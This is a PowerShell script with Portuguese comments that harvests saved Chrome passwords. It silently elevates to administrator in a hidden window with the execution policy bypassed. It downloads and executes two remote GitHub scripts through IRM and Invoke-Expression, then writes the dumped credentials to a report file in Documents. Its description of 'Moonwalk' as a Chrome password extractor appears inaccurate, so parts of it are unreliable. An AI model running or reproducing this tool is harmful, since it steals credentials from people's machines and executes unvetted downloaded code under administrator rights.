# ExtrairSenhas.ps1 - Versão usando Moonwalk (mais atual)

if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`"" -Verb RunAs -WindowStyle Hidden
    exit
}

$pastaDocuments = [Environment]::GetFolderPath("MyDocuments")
if (-not (Test-Path $pastaDocuments)) {
    $pastaDocuments = Join-Path $env:USERPROFILE "Documents"
}

$datahora = Get-Date -Format "yyyyMMdd_HHmmss"
$arquivoSaida = Join-Path $pastaDocuments "senhas_completo_$datahora.txt"

# Cabeçalho
$relatorio = @"
========================================
RELATÓRIO DE SENHAS (Moonwalk)
Data: $(Get-Date -Format "dd/MM/yyyy HH:mm:ss")
Computador: $env:COMPUTERNAME
========================================

"@

# Baixa e executa o Moonwalk (alternativa mais atual)
Write-Host "Baixando Moonwalk (extrator atualizado)..." -ForegroundColor Cyan

$moonwalkUrl = "https://raw.githubusercontent.com/mufeedvh/moonwalk/main/src/bin/moonwalk.ps1"
try {
    $moonwalk = IRM $moonwalkUrl -ErrorAction Stop
    $relatorio += "[OK] Moonwalk carregado com sucesso`n"
    Write-Host "Moonwalk carregado!" -ForegroundColor Green
} catch {
    $relatorio += "[ERRO] Falha ao carregar Moonwalk: $_`n"
    $relatorio | Out-File -FilePath $arquivoSaida -Encoding UTF8
    Start-Process notepad.exe $arquivoSaida
    exit
}

$null = Invoke-Expression $moonwalk

# Tenta extrair com Moonwalk
$relatorio += "`n--- Chrome (via Moonwalk) ---`n"
try {
    $output = Get-ChromePasswords 2>&1
    if ($output -match "@" -or $output -match "password") {
        $relatorio += $output
    } else {
        $relatorio += "Nenhuma senha encontrada ou erro na extracao`n"
    }
} catch {
    $relatorio += "ERRO: $($_.Exception.Message)`n"
}

# Também tenta com o método original (fallback)
$relatorio += "`n--- Chrome (via PowerChrome - fallback) ---`n"
try {
    $script = IRM 'https://raw.githubusercontent.com/The-Viper-One/Invoke-PowerChrome/refs/heads/main/Invoke-PowerChrome.ps1'
    $null = Invoke-Expression $script
    $output = Invoke-PowerChrome -Browser Chrome 2>&1
    if ($output -match "https://") {
        $relatorio += $output
    } else {
        $relatorio += "PowerChrome tambem falhou. Pode ser necessario atualizar o Chrome ou o metodo de criptografia mudou.`n"
    }
} catch {
    $relatorio += "PowerChrome falhou: $($_.Exception.Message)`n"
}

$relatorio += "`n========================================`n"
$relatorio += "FIM DO RELATÓRIO`n"
$relatorio += "========================================`n"

$relatorio | Out-File -FilePath $arquivoSaida -Encoding UTF8

if (Test-Path $arquivoSaida) {
    $tamanho = [math]::Round((Get-Item $arquivoSaida).Length / 1KB, 2)
    Write-Host "Relatorio salvo em: $arquivoSaida ($tamanho KB)" -ForegroundColor Green
    Start-Process notepad.exe $arquivoSaida
}

exit
